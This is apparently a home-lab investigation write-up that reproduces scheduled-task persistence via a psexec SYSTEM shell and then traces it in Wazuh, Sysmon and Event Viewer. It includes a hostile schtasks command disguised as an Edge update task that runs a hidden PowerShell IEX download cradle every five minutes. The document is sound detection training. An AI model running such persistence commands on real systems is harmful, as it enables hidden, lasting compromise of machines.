# 05 — Investigation (triage steps, actual)

1. **Foothold confirmed:** `impacket-psexec v0.14.0` (adminlab) → SYSTEM shell; uploaded `TVMxBfgf.exe`, service `rPEs`. 📸 `01-kali-psexec-shell.png`
2. **Task created:** `schtasks /create /tn MicrosoftEdgeUpdateTask /tr "powershell -nop -w hidden IEX...payload.ps1" /sc minute /mo 5 /ru SYSTEM /f` → SUCCESS. 📸 `02-kali-schtasks-create.png`
3. **Task verified:** query shows Enabled, Run As SYSTEM, Minute schedule. 📸 `03-kali-schtasks-query.png`
4. **Task triggered:** `schtasks /run` → SUCCESS (payload fired). 📸 `04-kali-schtasks-run.png`
5. **4698 found in Wazuh:** `data.win.system.eventID:4698` → full task XML logged; task name `\MicrosoftEdgeUpdateTask`, action = IEX cradle, Hidden=true, SYSTEM, every 5 min. 📸 `07-wazuh-4698-task-created.png`
6. **Sysmon 1 found:** schtasks.exe (32-bit) process create, full command line, hashes, T1053.005 tag. 📸 `08-wazuh-sysmon-1-schtasks.png`
7. **Sysmon 11 found:** task file `C:\Windows\System32\Tasks\MicrosoftEdgeUpdateTask` created by svchost.exe (T1053.005 tag). 📸 `09-wazuh-sysmon-11-task-file.png`
8. **Corroborated on host:** Event Viewer Security log → 2×4698 (5:35:14, 5:47:49 local), subject SYSTEM. 📸 `12-windows-eventviewer-4698.png`
9. **Containment:** `schtasks /delete /tn MicrosoftEdgeUpdateTask /f` → SUCCESS. Deleted task file, rotated adminlab, blocked .106 (lab). 📸 `06-kali-schtasks-delete.png`

## Evidence folder (9 screenshots)

| File | Content |
|---|---|
| `01-kali-psexec-shell.png` | impacket-psexec SYSTEM shell (TVMxBfgf.exe, service rPEs) |
| `02-kali-schtasks-create.png` | schtasks /create SUCCESS |
| `03-kali-schtasks-query.png` | task query: Enabled, SYSTEM, Minute schedule |
| `04-kali-schtasks-run.png` | schtasks /run SUCCESS |
| `06-kali-schtasks-delete.png` | schtasks /delete SUCCESS (cleanup) |
| `07-wazuh-4698-task-created.png` | 4698 full task XML (money shot) |
| `08-wazuh-sysmon-1-schtasks.png` | Sysmon 1: schtasks.exe cmd line + hashes + T1053.005 |
| `09-wazuh-sysmon-11-task-file.png` | Sysmon 11: task file created by svchost.exe |
| `12-windows-eventviewer-4698.png` | Event Viewer: 2×4698, subject SYSTEM |

## Analyst note

The 4698 `subjectUserName` is `DESKTOP-F0JVTQT$` (SYSTEM, S-1-5-18) because the task was created from within the psexec SYSTEM shell — not a user account. This is itself an indicator: scheduled tasks created by SYSTEM context (not an interactive admin) are suspicious. Time offset between Windows local (5:47 AM) and Sysmon UTC (12:47Z) persists — NTP hardening still recommended.
